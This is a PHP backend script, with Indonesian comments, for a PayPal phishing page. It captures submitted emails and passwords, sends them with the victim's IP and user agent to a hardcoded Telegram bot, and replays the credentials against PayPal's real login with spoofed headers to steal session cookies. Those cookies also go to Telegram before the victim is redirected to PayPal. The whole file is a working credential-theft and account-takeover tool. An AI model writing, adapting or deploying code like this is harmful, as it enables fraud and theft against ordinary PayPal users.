<?php
// Fix: Pake variable yang bener, jangan hardcode token di getenv
$botToken = getenv('BOT_TOKEN') ?: '8896059398:AAGR0eMN-7_Q-UXBGO6LnXMAoESiMHt34Sg';
$chatId = getenv('CHAT_ID') ?: '8992368095';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';

    // Data Pemanis
    $ip = $_SERVER['REMOTE_ADDR'];
    $message = "🔑 *New PayPal Catch*\n\n📧 Email: `{$email}`\n🔒 Pass: `{$password}`\n🌍 IP: `{$ip}`\n🖥 UA: `{$userAgent}`";

    // Kirim ke Telegram
    $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegramUrl);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ['chat_id' => $chatId, 'text' => $message, 'parse_mode' => 'Markdown']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    curl_exec($ch);
    curl_close($ch);

    // Simulasi Login PayPal (Stealth Mode)
    $cookieJar = tempnam(sys_get_temp_dir(), 'pp_cookie');
    $ch2 = curl_init('https://www.paypal.com/signin');
    curl_setopt($ch2, CURLOPT_POST, true);
    curl_setopt($ch2, CURLOPT_POSTFIELDS, http_build_query(['login_email' => $email, 'login_password' => $password]));
    curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch2, CURLOPT_COOKIEJAR, $cookieJar);
    curl_setopt($ch2, CURLOPT_COOKIEFILE, $cookieJar);
    curl_setopt($ch2, CURLOPT_USERAGENT, $userAgent);
    curl_setopt($ch2, CURLOPT_HTTPHEADER, [
        'Origin: https://www.paypal.com',
        'Referer: https://www.paypal.com/signin',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
    ]);
    
    $response = curl_exec($ch2);
    $headerContent = curl_getinfo($ch2, CURLINFO_HEADER_OUT);
    curl_close($ch2);

    // Ambil Cookie Silonya
    $cookies = file_get_contents($cookieJar);
    if (strpos($cookies, 'XP-PP-SILO') !== false) {
        // Kirim hasil jarahan cookie
        $ch3 = curl_init($telegramUrl);
        curl_setopt($ch3, CURLOPT_POST, true);
        curl_setopt($ch3, CURLOPT_POSTFIELDS, ['chat_id' => $chatId, 'text' => "🍪 *Got Silo Cookie:*\n`" . $cookies . "`", 'parse_mode' => 'Markdown']);
        curl_setopt($ch3, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch3);
        curl_close($ch3);
    }

    unlink($cookieJar);
    header('Location: https://www.paypal.com/signin');
    exit;
}
?>
